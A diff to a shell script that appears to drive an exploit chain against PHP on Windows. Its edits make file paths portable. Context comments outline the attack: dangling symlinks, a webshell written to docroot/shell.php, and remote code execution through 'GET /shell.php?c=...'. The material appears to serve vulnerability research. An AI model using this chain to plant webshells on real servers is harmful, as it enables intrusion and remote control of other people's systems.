@@ -10,10 +10,16 @@
 #   W5: DANGLING symlink + pipe key                -> target created 0-byte?
 #   W6: DANGLING symlink -> docroot/shell.php + payload key + cleanup=0 -> webshell written
 #   W7: GET /shell.php?c=...                       -> RCE receipt
-WP3=/c/Users/andre/Downloads/php2shell-claude/wp3
-PY=/c/Python313/python
-UPCLIENT=/c/Users/andre/Downloads/php2shell-claude/wp2/wp2_upclient.py
-REC=$WP3/receipts/win
+HERE=$(cd "$(dirname "$0")" && pwd)
+WP3=$HERE/wp3
+if [ ! -x "$WP3/winphp/8512/php.exe" ]; then
+  for _c in /c/Users/andre/Downloads/php2shell-claude/wp3 /mnt/c/Users/andre/Downloads/php2shell-claude/wp3; do
+    if [ -x "$_c/winphp/8512/php.exe" ]; then WP3=$_c; break; fi
+  done
+fi
+PY=${PY:-/c/Python313/python}
+UPCLIENT=$HERE/wp2/wp2_upclient.py
+REC=$HERE/receipts/win
 mkdir -p "$REC"
 
 hexkey() { "$PY" -c 'import sys;print(sys.argv[1].encode().hex())' "$1"; }
